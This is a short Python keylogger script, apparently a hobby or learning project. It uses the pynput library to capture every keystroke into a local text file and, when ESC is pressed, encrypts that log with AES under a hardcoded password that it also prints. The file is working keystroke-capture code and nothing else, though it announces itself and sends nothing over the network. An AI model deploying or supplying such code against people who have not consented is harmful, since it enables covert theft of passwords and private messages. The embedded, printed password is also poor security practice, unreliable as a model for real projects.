import os
from contextlib import suppress

from pynput.keyboard import Key, Listener

from aes_encrypt_decrypt import encrypt_file

LOG_FILE = "vvlogs.txt"
ENCRYPTED_LOG = "vvlogs.txt.enc"
PASSWORD = "Varma@8135"


def write_to_file(key):
    
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == "Key.space":
            letter = " "
    elif letter == "Key.shift_r" or letter == "Key.ctrl_l":
            letter = ""
    elif letter == "Key.enter":
            letter = "\n"
    elif letter == "Key.tab":
            letter = "\t"
    elif letter == "Key.backspace":
            letter = "[BACKSPACE]"
    elif letter == "Key.esc":
            letter = "[ESC]"

    with suppress(OSError), open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(letter)
            


def on_release(key):
    if key == Key.esc:
            with suppress(OSError), open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write("\n[KEYLOGGER STOPPED]\n")
            if os.path.exists(LOG_FILE):
                encrypt_file(LOG_FILE, ENCRYPTED_LOG, password=PASSWORD)
            return False


if __name__ == "__main__":
    print(f"Keylogger started. Press ESC to stop and encrypt {ENCRYPTED_LOG}.")
    print(f"Password: {PASSWORD}")
    with Listener(on_press=write_to_file, on_release=on_release) as listener:
        listener.join()
